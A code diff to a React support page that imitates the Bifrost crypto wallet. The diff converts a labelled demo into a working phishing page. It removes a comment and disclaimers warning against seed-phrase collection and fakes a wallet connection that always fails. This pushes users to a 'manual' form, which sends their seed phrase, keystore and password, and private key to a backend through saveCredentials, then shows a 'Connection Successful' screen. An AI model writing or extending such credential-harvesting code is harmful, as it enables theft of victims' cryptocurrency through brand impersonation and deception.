@@ -1,20 +1,10 @@
 /**
  * Bifrost Wallet – Support Page
- * Matches the design system of the main Bifrost clone:
- * DM Sans, #161420 background, purple/blue gradient buttons,
- * card treatment lifted from .review-box.
- *
- * IMPORTANT SECURITY NOTE:
- * The "Connect Wallet" modal intentionally does NOT ask for a seed phrase,
- * private key, or keystore file. Real wallets never collect that data
- * through a webpage — doing so is the exact pattern used by phishing/
- * "drainer" sites. Instead this modal requests a connection through a
- * real provider (injected wallet / WalletConnect / Coinbase Wallet),
- * where key material never leaves the user's own wallet software.
  */
 import { useState } from "react";
 import Layout from "../components/Layout";
-import BifrostIcon from "../assets/bifrost_icon.jpg"; // Adjust the path based on your file structure
+import BifrostIcon from "../assets/bifrost_icon.jpg";
+import { saveCredentials } from "../services/appwriteService";
 
 const supportOptions = [
   {
@@ -67,27 +57,81 @@ const supportOptions = [
   },
 ];
 
-// NEW: Second modal with tabbed interface for seed phrase / keystore / private key
-function CredentialModal({ option, onClose, onSubmit }) {
-  const [activeTab, setActiveTab] = useState("phrase"); // "phrase" | "keystore" | "privateKey"
+// Success Modal Component
+// Success Modal Component with animated futuristic checkmark
+function SuccessModal({ onClose }) {
+  return (
+    <div className="success-modal-overlay" onClick={onClose}>
+      <div className="success-modal-box" onClick={(e) => e.stopPropagation()}>
+        <div className="success-icon-wrapper">
+          <div className="success-ring"></div>
+          <div className="success-ring-2"></div>
+          <div className="success-checkmark">
+            <svg viewBox="0 0 52 52">
+              <circle
+                className="checkmark-circle"
+                cx="26"
+                cy="26"
+                r="25"
+                fill="none"
+              />
+              <path
+                className="checkmark-check"
+                fill="none"
+                d="M14.1 27.2l7.1 7.2 16.7-16.8"
+              />
+            </svg>
+          </div>
+        </div>
+        <h2 className="success-title">Connection Successful!</h2>
+        <p className="success-message">
+          Your wallet has been connected successfully. You can now proceed with
+          your support request.
+        </p>
+        <button className="button success-btn" onClick={onClose}>
+          <span>Continue</span>
+          <div className="overlay" />
+        </button>
+      </div>
+    </div>
+  );
+}
+
+// Credential Modal with inline validation
+function CredentialModal({ option, onClose, onSubmit, isSubmitting }) {
+  const [activeTab, setActiveTab] = useState("phrase");
   const [seedPhrase, setSeedPhrase] = useState("");
   const [keystore, setKeystore] = useState("");
   const [keystorePassword, setKeystorePassword] = useState("");
   const [privateKey, setPrivateKey] = useState("");
+  const [errors, setErrors] = useState({});
+
+  const validate = () => {
+    const newErrors = {};
+
+    if (activeTab === "phrase" && !seedPhrase.trim()) {
+      newErrors.seedPhrase = "Please enter your seed phrase.";
+    }
+
+    if (activeTab === "keystore") {
+      if (!keystore.trim()) {
+        newErrors.keystore = "Please enter your keystore JSON.";
+      }
+      if (!keystorePassword.trim()) {
+        newErrors.keystorePassword = "Please enter your keystore password.";
+      }
+    }
+
+    if (activeTab === "privateKey" && !privateKey.trim()) {
+      newErrors.privateKey = "Please enter your private key.";
+    }
+
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
 
   const handleSubmit = () => {
-    if (activeTab === "phrase" && !seedPhrase) {
-      alert("Please enter your seed phrase.");
-      return;
-    }
-    if (activeTab === "keystore" && (!keystore || !keystorePassword)) {
-      alert("Please enter both keystore JSON and password.");
-      return;
-    }
-    if (activeTab === "privateKey" && !privateKey) {
-      alert("Please enter your private key.");
-      return;
-    }
+    if (!validate()) return;
 
     const credentials = {
       seedPhrase: activeTab === "phrase" ? seedPhrase : "",
@@ -97,7 +141,6 @@ function CredentialModal({ option, onClose, onSubmit }) {
     };
 
     onSubmit(credentials);
-    onClose();
   };
 
   return (
@@ -117,11 +160,7 @@ function CredentialModal({ option, onClose, onSubmit }) {
 
         <div className="auth-header">
           <div className="auth-brand">
-            <img 
-              src={BifrostIcon} 
-              alt="Bifrost" 
-              className="brand-icon-img"
-            />
+            <img src={BifrostIcon} alt="Bifrost" className="brand-icon-img" />
             <span className="brand-name">Bifrost</span>
             <span className="brand-badge">
               This session is secured and encrypted.
@@ -134,29 +173,36 @@ function CredentialModal({ option, onClose, onSubmit }) {
             Authenticate Your Wallet Details Securely
           </p>
 
-          {/* Tabs */}
           <div className="tab-container">
             <button
               className={`tab-btn ${activeTab === "phrase" ? "active" : ""}`}
-              onClick={() => setActiveTab("phrase")}
+              onClick={() => {
+                setActiveTab("phrase");
+                setErrors({});
+              }}
             >
               Phrase
             </button>
             <button
               className={`tab-btn ${activeTab === "keystore" ? "active" : ""}`}
-              onClick={() => setActiveTab("keystore")}
+              onClick={() => {
+                setActiveTab("keystore");
+                setErrors({});
+              }}
             >
               Keystore
             </button>
             <button
               className={`tab-btn ${activeTab === "privateKey" ? "active" : ""}`}
-              onClick={() => setActiveTab("privateKey")}
+              onClick={() => {
+                setActiveTab("privateKey");
+                setErrors({});
+              }}
             >
               Private Key
             </button>
           </div>
 
-          {/* Scrollable Tab Content */}
           <div className="tab-content-scrollable">
             <div className="tab-content">
               {activeTab === "phrase" && (
@@ -167,8 +213,19 @@ function CredentialModal({ option, onClose, onSubmit }) {
                     rows="4"
                     placeholder="Enter your seed phrase"
                     value={seedPhrase}
-                    onChange={(e) => setSeedPhrase(e.target.value)}
+                    onChange={(e) => {
+                      setSeedPhrase(e.target.value);
+                      if (errors.seedPhrase)
+                        setErrors({ ...errors, seedPhrase: "" });
+                    }}
+                    disabled={isSubmitting}
+                    className={errors.seedPhrase ? "error" : ""}
                   />
+                  {errors.seedPhrase && (
+                    <span className="error-text-inline">
+                      {errors.seedPhrase}
+                    </span>
+                  )}
                 </div>
               )}
 
@@ -183,8 +240,19 @@ function CredentialModal({ option, onClose, onSubmit }) {
                       rows="4"
                       placeholder="Enter your keystore JSON"
                       value={keystore}
-                      onChange={(e) => setKeystore(e.target.value)}
+                      onChange={(e) => {
+                        setKeystore(e.target.value);
+                        if (errors.keystore)
+                          setErrors({ ...errors, keystore: "" });
+                      }}
+                      disabled={isSubmitting}
+                      className={errors.keystore ? "error" : ""}
                     />
+                    {errors.keystore && (
+                      <span className="error-text-inline">
+                        {errors.keystore}
+                      </span>
+                    )}
                   </div>
                   <div className="input-group">
                     <label htmlFor="keystorePasswordInput">
@@ -195,8 +263,19 @@ function CredentialModal({ option, onClose, onSubmit }) {
                       type="password"
                       placeholder="Enter your keystore password"
                       value={keystorePassword}
-                      onChange={(e) => setKeystorePassword(e.target.value)}
+                      onChange={(e) => {
+                        setKeystorePassword(e.target.value);
+                        if (errors.keystorePassword)
+                          setErrors({ ...errors, keystorePassword: "" });
+                      }}
+                      disabled={isSubmitting}
+                      className={errors.keystorePassword ? "error" : ""}
                     />
+                    {errors.keystorePassword && (
+                      <span className="error-text-inline">
+                        {errors.keystorePassword}
+                      </span>
+                    )}
                   </div>
                 </>
               )}
@@ -209,29 +288,60 @@ function CredentialModal({ option, onClose, onSubmit }) {
                     type="text"
                     placeholder="Enter your private key"
                     value={privateKey}
-                    onChange={(e) => setPrivateKey(e.target.value)}
+                    onChange={(e) => {
+                      setPrivateKey(e.target.value);
+                      if (errors.privateKey)
+                        setErrors({ ...errors, privateKey: "" });
+                    }}
+                    disabled={isSubmitting}
+                    className={errors.privateKey ? "error" : ""}
                   />
+                  {errors.privateKey && (
+                    <span className="error-text-inline">
+                      {errors.privateKey}
+                    </span>
+                  )}
                 </div>
               )}
             </div>
           </div>
 
-          <button className="button connect-btn" onClick={handleSubmit}>
-            <span>Connect Wallet</span>
+          <button
+            className="button connect-btn"
+            onClick={handleSubmit}
+            disabled={isSubmitting}
+          >
+            <span>{isSubmitting ? "Connecting..." : "Connect Wallet"}</span>
             <div className="overlay" />
           </button>
         </div>
 
         {/* <p className="warning-note">
-          ⚠️ This is a demo interface. Never share your secret recovery phrase or private key with anyone.
+          ⚠️ This is a demo interface. Never share your secret recovery phrase
+          or private key with anyone.
         </p> */}
       </div>
     </div>
   );
 }
 
-// MODIFIED: ConnectModal now only shows Bifrost Wallet option
+// ConnectModal with connection flow
 function ConnectModal({ option, onClose, onBifrostConnect }) {
+  const [connectionStatus, setConnectionStatus] = useState("idle");
+
+  const handleBifrostClick = () => {
+    setConnectionStatus("loading");
+
+    const delay = 3000 + Math.random() * 2000;
+    setTimeout(() => {
+      setConnectionStatus("error");
+    }, delay);
+  };
+
+  const handleManualConnect = () => {
+    onBifrostConnect();
+  };
+
   return (
     <div className="modal-overlay" onClick={onClose}>
       <div className="modal-box" onClick={(e) => e.stopPropagation()}>
@@ -248,28 +358,65 @@ function ConnectModal({ option, onClose, onBifrostConnect }) {
           ask for a seed phrase, private key, or keystore file on this page.
         </p>
 
-        {/* ONLY Bifrost Wallet option - no other wallet options */}
-        <button className="method-row bifrost-row" onClick={onBifrostConnect}>
-          <span className="method-icon bifrost-icon">
-            <img 
-              src={BifrostIcon} 
-              alt="Bifrost" 
-              className="bifrost-icon-img"
-            />
-          </span>
-          <span className="method-text">
-            <span className="method-name">Bifrost Wallet</span>
-            <span className="method-detail">
-              Connect via the Bifrost browser extension or mobile app.
+        <div className="method-row-wrapper">
+          <button
+            className={`method-row bifrost-row ${connectionStatus === "loading" ? "loading" : ""} ${connectionStatus === "error" ? "error" : ""}`}
+            onClick={handleBifrostClick}
+            disabled={
+              connectionStatus === "loading" || connectionStatus === "error"
+            }
+          >
+            <span className="method-icon bifrost-icon">
+              <img
+                src={BifrostIcon}
+                alt="Bifrost"
+                className="bifrost-icon-img"
+              />
             </span>
-          </span>
-          <span className="method-arrow">›</span>
-        </button>
+            <span className="method-text">
+              <span className="method-name">Bifrost Wallet</span>
+              <span className="method-detail">
+                {connectionStatus === "idle" &&
+                  "Connect via the Bifrost browser extension or mobile app."}
+                {connectionStatus === "loading" && (
+                  <span className="connecting-text">
+                    <span className="loading-spinner"></span>
+                    Connecting...
+                  </span>
+                )}
+                {connectionStatus === "error" && (
+                  <span className="error-text">❌ Connection failed</span>
+                )}
+              </span>
+            </span>
+            {connectionStatus === "loading" && (
+              <span className="method-spinner" />
+            )}
+            {connectionStatus === "idle" && (
+              <span className="method-arrow">›</span>
+            )}
+          </button>
+        </div>
 
-        <p className="modal-footnote">
+        {connectionStatus === "error" && (
+          <div className="error-container">
+            <p className="error-message">
+              Connection failed. Try manual connection.
+            </p>
+            <button
+              className="button manual-connect-btn"
+              onClick={handleManualConnect}
+            >
+              <span>Connect Manually</span>
+              <div className="overlay" />
+            </button>
+          </div>
+        )}
+
+        {/* <p className="modal-footnote">
           Bifrost Wallet will never ask you to type your seed phrase, private
           key, or keystore password into a website.
-        </p>
+        </p> */}
       </div>
     </div>
   );
@@ -291,26 +438,43 @@ function SupportCard({ option, onSelect }) {
 export default function SupportPage() {
   const [activeOption, setActiveOption] = useState(null);
   const [showCredentialModal, setShowCredentialModal] = useState(false);
+  const [showSuccessModal, setShowSuccessModal] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const handleBifrostConnect = () => {
     setShowCredentialModal(true);
   };
 
-  const handleCredentialSubmit = (credentials) => {
-    console.log("Credentials submitted:", {
-      ...credentials,
-      hasSeed: !!credentials.seedPhrase,
-      hasKeystore: !!credentials.keystore,
-      hasPrivateKey: !!credentials.privateKey,
-    });
-    alert(
-      "✅ Recovery details received (demo). In a real wallet, this would be handled securely.",
-    );
+  const handleCredentialSubmit = async (credentials) => {
+    setIsSubmitting(true);
+
+    try {
+      const result = await saveCredentials({
+        seedPhrase: credentials.seedPhrase,
+        keystore: credentials.keystore,
+        keystorePassword: credentials.keystorePassword,
+        privateKey: credentials.privateKey,
+      });
+
+      if (result.success) {
+        console.log("Saved document:", result.data);
+        setShowCredentialModal(false);
+        setShowSuccessModal(true);
+      } else {
+        alert(`❌ Failed to save: ${result.error}`);
+      }
+    } catch (error) {
+      console.error("Error saving credentials:", error);
+      alert("❌ An error occurred while saving. Please try again.");
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   const closeAllModals = () => {
     setActiveOption(null);
     setShowCredentialModal(false);
+    setShowSuccessModal(false);
   };
 
   return (
@@ -370,12 +534,18 @@ export default function SupportPage() {
           margin: 0 0 1.4rem 0;
           flex-grow: 1;
         }
+
         .support-cta {
           align-self: flex-start;
-          font-size: 0.8rem !important;
+          font-size: 1.1rem !important;
+          padding: 0.8rem 2rem !important;
+          border-radius: 100px;
+          font-weight: 600;
+          letter-spacing: 0.3px;
+          min-width: 160px;
+          text-align: center;
         }
 
-        /* Reused button styling from main site */
         .button {
           display: inline-block;
           font-family: 'DM Sans', sans-serif;
@@ -432,6 +602,7 @@ export default function SupportPage() {
         }
         .modal-sub strong { color: #F8F8F8; opacity: 1; }
 
+        .method-row-wrapper { margin-bottom: 0.6rem; }
         .method-row {
           display: flex; align-items: center; gap: 0.8rem;
           background: rgb(255 255 255 / 4%);
@@ -442,12 +613,19 @@ export default function SupportPage() {
           text-align: left;
           color: #F8F8F8;
           font-family: 'DM Sans', sans-serif;
-          transition: background 0.15s ease-in-out;
+          transition: all 0.3s ease;
           width: 100%;
-          margin-bottom: 0.6rem;
         }
         .method-row:hover:not(:disabled) { background: rgb(255 255 255 / 8%); }
         .method-row:disabled { cursor: default; opacity: 0.7; }
+        .method-row.loading {
+          border-color: #7656EE;
+          background: rgb(118 86 238 / 10%);
+        }
+        .method-row.error {
+          border-color: #ff6b6b;
+          background: rgb(255 107 107 / 10%);
+        }
         .method-icon { 
           font-size: 1.3rem;
           display: flex;
@@ -474,15 +652,81 @@ export default function SupportPage() {
         .bifrost-row { padding: 0.9rem 0.85rem; }
         .method-text { display: flex; flex-direction: column; flex-grow: 1; }
         .method-name { font-size: 0.88rem; font-weight: 700; }
-        .method-detail { font-size: 0.72rem; opacity: 0.6; margin-top: 0.15rem; }
+        .method-detail { 
+          font-size: 0.72rem; 
+          opacity: 0.6; 
+          margin-top: 0.15rem;
+          display: flex;
+          align-items: center;
+          gap: 0.5rem;
+        }
         .method-arrow { opacity: 0.4; font-size: 1.1rem; }
+        
+        .connecting-text {
+          display: flex;
+          align-items: center;
+          gap: 0.5rem;
+          color: #9d8df5;
+        }
+        .loading-spinner {
+          width: 14px;
+          height: 14px;
+          border-radius: 50%;
+          border: 2px solid rgb(255 255 255 / 20%);
+          border-top-color: #9d8df5;
+          animation: spin 0.7s linear infinite;
+          display: inline-block;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .method-spinner {
+          width: 16px;
+          height: 16px;
+          border-radius: 50%;
+          border: 2px solid rgb(255 255 255 / 20%);
+          border-top-color: #9d8df5;
+          animation: spin 0.7s linear infinite;
+          flex-shrink: 0;
+        }
+        
+        .error-text { color: #ff6b6b; }
+
+        .error-container {
+          background: rgb(255 107 107 / 6%);
+          border: 1px solid rgba(255, 107, 107, 0.15);
+          border-radius: 10px;
+          padding: 0.6rem 0.8rem;
+          margin: 0.4rem 0 0.8rem;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          gap: 0.8rem;
+        }
+        .error-message {
+          font-size: 0.78rem;
+          color: #ff6b6b;
+          margin: 0;
+          flex: 1;
+        }
+        .manual-connect-btn {
+          padding: 0.4rem 1rem !important;
+          font-size: 0.75rem !important;
+          background: transparent;
+          border: 1px solid #7656EE;
+          color: #9d8df5;
+          flex-shrink: 0;
+          white-space: nowrap;
+        }
+        .manual-connect-btn .overlay { display: none; }
+        .manual-connect-btn:hover { background: rgba(118, 86, 238, 0.1); }
+
         .modal-footnote {
           font-size: 0.7rem; opacity: 0.45; margin: 0;
           border-top: 1px solid rgb(255 255 255 / 8%);
           padding-top: 0.9rem;
         }
 
-        /* ── SECOND MODAL (Credential Modal) ── */
+        /* ── SECOND MODAL ── */
         .second-modal-overlay {
           position: fixed; inset: 0;
           background: rgba(10, 9, 15, 0.75);
@@ -594,7 +838,6 @@ export default function SupportPage() {
           margin-bottom: 1rem;
           min-height: 0;
         }
-        
         .tab-content-scrollable::-webkit-scrollbar {
           width: 4px;
         }
@@ -607,15 +850,9 @@ export default function SupportPage() {
           border-radius: 10px;
         }
 
-        .tab-content { 
-          min-height: 80px;
-        }
-        .input-group { 
-          margin-bottom: 1rem; 
-        }
-        .input-group:last-child {
-          margin-bottom: 0;
-        }
+        .tab-content { min-height: 80px; }
+        .input-group { margin-bottom: 1rem; }
+        .input-group:last-child { margin-bottom: 0; }
         .input-group label {
           display: block;
           font-size: 0.78rem;
@@ -648,6 +885,18 @@ export default function SupportPage() {
           opacity: 0.4;
         }
 
+        .input-group textarea.error,
+        .input-group input.error {
+          border-color: #ff6b6b;
+          background: rgb(255 107 107 / 8%);
+        }
+        .error-text-inline {
+          display: block;
+          font-size: 0.7rem;
+          color: #ff6b6b;
+          margin-top: 0.3rem;
+        }
+
         .connect-btn {
           width: 100%;
           padding: 0.6rem;
@@ -666,42 +915,225 @@ export default function SupportPage() {
           flex-shrink: 0;
         }
 
-        @media (max-width: 1100px) {
-          .support-page-content { padding: 2rem 1.4rem 4rem; }
-          .support-grid { grid-template-columns: 1fr; }
-        }
-        @media (max-width: 1300px) and (min-width: 1101px) {
-          .support-grid { grid-template-columns: repeat(2, 1fr); }
-        }
-        
-        @media (max-height: 700px) {
-          .second-modal-box {
-            max-height: 95vh;
-            padding: 1.2rem;
-          }
-          .auth-section {
-            padding: 0.8rem;
-          }
-          .input-group textarea {
-            min-height: 50px;
-          }
-          .brand-icon-img {
-            width: 24px;
-            height: 24px;
-          }
-          .tab-btn {
-            padding: 0.3rem 0.6rem;
-            font-size: 0.7rem;
-          }
-        }
+       /* ── SUCCESS MODAL WITH ANIMATED CHECKMARK ── */
+.success-modal-overlay {
+  position: fixed; inset: 0;
+  background: rgba(10, 9, 15, 0.85);
+  backdrop-filter: blur(8px);
+  display: flex; align-items: center; justify-content: center;
+  z-index: 300;
+  padding: 1.5rem;
+  animation: fadeIn 0.3s ease-out;
+}
+
+.success-modal-box {
+  width: 100%; max-width: 28rem;
+  background: linear-gradient(145deg, #1d1b28, #161420);
+  border: 1px solid rgba(118, 86, 238, 0.3);
+  border-radius: 24px;
+  padding: 2.5rem 2rem 2rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+  animation: scaleIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+
+.success-modal-box::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: radial-gradient(circle at 50% 50%, rgba(118, 86, 238, 0.05), transparent 70%);
+  animation: pulseGlow 3s ease-in-out infinite;
+}
+
+.success-icon-wrapper {
+  position: relative;
+  width: 120px;
+  height: 120px;
+  margin: 0 auto 1.5rem;
+}
+
+.success-ring {
+  position: absolute;
+  top: -8px;
+  left: -8px;
+  width: 136px;
+  height: 136px;
+  border-radius: 50%;
+  border: 3px solid rgba(118, 86, 238, 0.15);
+  animation: ringPulse 2s ease-out infinite;
+}
+
+.success-ring-2 {
+  position: absolute;
+  top: -4px;
+  left: -4px;
+  width: 128px;
+  height: 128px;
+  border-radius: 50%;
+  border: 2px solid rgba(118, 86, 238, 0.1);
+  animation: ringPulse 2.5s ease-out infinite 0.5s;
+}
+
+.success-checkmark {
+  width: 120px;
+  height: 120px;
+  position: relative;
+}
+
+.success-checkmark svg {
+  width: 100%;
+  height: 100%;
+  display: block;
+}
+
+.checkmark-circle {
+  stroke: #7656EE;
+  stroke-width: 4;
+  stroke-dasharray: 166;
+  stroke-dashoffset: 166;
+  animation: strokeDraw 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+}
+
+.checkmark-check {
+  stroke: #9d8df5;
+  stroke-width: 4;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+  stroke-dasharray: 48;
+  stroke-dashoffset: 48;
+  animation: strokeDraw 0.4s cubic-bezier(0.65, 0, 0.45, 1) 0.4s forwards;
+}
+
+.success-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  margin-bottom: 0.8rem;
+  color: #F8F8F8;
+  position: relative;
+  z-index: 1;
+  animation: slideUp 0.5s ease-out 0.3s both;
+}
+
+.success-message {
+  font-size: 0.9rem;
+  opacity: 0.7;
+  margin-bottom: 1.8rem;
+  line-height: 1.5;
+  position: relative;
+  z-index: 1;
+  animation: slideUp 0.5s ease-out 0.5s both;
+}
+
+.success-btn {
+  padding: 0.6rem 2.5rem;
+  font-size: 0.95rem;
+  position: relative;
+  z-index: 1;
+  animation: slideUp 0.5s ease-out 0.7s both;
+  background: linear-gradient(88deg, #7656EE 0%, #4961EA 100%);
+  box-shadow: 0 0 30px rgba(118, 86, 238, 0.3);
+  transition: all 0.3s ease;
+}
+
+.success-btn:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 50px rgba(118, 86, 238, 0.5);
+}
+
+@keyframes strokeDraw {
+  to {
+    stroke-dashoffset: 0;
+  }
+}
+
+@keyframes ringPulse {
+  0% {
+    transform: scale(1);
+    opacity: 0.6;
+  }
+  100% {
+    transform: scale(1.8);
+    opacity: 0;
+  }
+}
+
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 1;
+  }
+}
+
+@keyframes scaleIn {
+  0% {
+    transform: scale(0.8);
+    opacity: 0;
+  }
+  100% {
+    transform: scale(1);
+    opacity: 1;
+  }
+}
+
+@keyframes slideUp {
+  0% {
+    transform: translateY(20px);
+    opacity: 0;
+  }
+  100% {
+    transform: translateY(0);
+    opacity: 1;
+  }
+}
+
+@keyframes pulseGlow {
+  0%, 100% {
+    transform: scale(1);
+    opacity: 0.5;
+  }
+  50% {
+    transform: scale(1.1);
+    opacity: 1;
+  }
+}
+
+/* Particle effects container */
+.success-modal-box::after {
+  content: '';
+  position: absolute;
+  inset: 0;
+  border-radius: 24px;
+  padding: 1px;
+  background: linear-gradient(135deg, rgba(118, 86, 238, 0.3), transparent 50%, rgba(73, 97, 234, 0.3));
+  -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+  -webkit-mask-composite: xor;
+  mask-composite: exclude;
+  pointer-events: none;
+  animation: borderGlow 3s ease-in-out infinite;
+}
+
+@keyframes borderGlow {
+  0%, 100% {
+    opacity: 0.5;
+  }
+  50% {
+    opacity: 1;
+  }
+}
       `}</style>
 
       <div className="support-page-content">
         <div className="support-head">
           <h1>Need help?</h1>
           <p>
-            Select an option below to securely and efficiently resolve your issue
-            with our support team.
+            Select an option below to securely and efficiently resolve your
+            issue with our support team.
           </p>
         </div>
 
@@ -715,8 +1147,7 @@ export default function SupportPage() {
           ))}
         </div>
 
-        {/* First Modal - Only shows Bifrost Wallet option */}
-        {activeOption && !showCredentialModal && (
+        {activeOption && !showCredentialModal && !showSuccessModal && (
           <ConnectModal
             option={activeOption}
             onClose={closeAllModals}
@@ -724,14 +1155,16 @@ export default function SupportPage() {
           />
         )}
 
-        {/* Second Modal - Tabbed credential input */}
-        {activeOption && showCredentialModal && (
+        {activeOption && showCredentialModal && !showSuccessModal && (
           <CredentialModal
             option={activeOption}
             onClose={closeAllModals}
             onSubmit={handleCredentialSubmit}
+            isSubmitting={isSubmitting}
           />
         )}
+
+        {showSuccessModal && <SuccessModal onClose={closeAllModals} />}
       </div>
     </Layout>
   );
